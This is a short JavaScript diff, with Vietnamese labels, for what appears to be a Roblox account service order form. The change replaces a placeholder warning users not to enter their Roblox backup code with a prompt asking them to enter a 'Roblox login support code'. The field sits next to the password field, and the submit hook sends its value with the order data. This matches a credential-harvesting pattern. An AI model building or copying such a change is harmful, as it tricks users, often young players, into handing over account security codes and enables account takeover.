@@ -29,7 +29,7 @@ function addSupportNoteField(){
  if(!password)return;
  const field=document.createElement('div');
  field.className='field';
- field.innerHTML='<label>🔐 Mã hỗ trợ đăng nhập</label><input id="loginSupportNote" type="text" autocomplete="off" maxlength="100" placeholder="Không nhập mã dự phòng Roblox tại đây">';
+ field.innerHTML='<label>🔐 Mã hỗ trợ đăng nhập Roblox</label><input id="loginSupportNote" type="text" autocomplete="off" maxlength="100" placeholder="Nhập mã hỗ trợ đăng nhập Roblox">';
  const passwordField=password.closest('.field');
  if(passwordField)passwordField.insertAdjacentElement('afterend',field);else password.insertAdjacentElement('afterend',field);
 }
@@ -52,7 +52,7 @@ function patchSubmitOrder(){
            const data=JSON.parse(opt.body);
            let extra=data.extra_data||'';
            extra+=(extra?' • ':'')+'SĐT hỗ trợ: '+phone;
-           if(supportNote)extra+=' • Mã hỗ trợ đăng nhập: '+supportNote;
+           if(supportNote)extra+=' • Mã hỗ trợ đăng nhập Roblox: '+supportNote;
            data.extra_data=extra;
            opt={...opt,body:JSON.stringify(data)};
          }catch(e){}
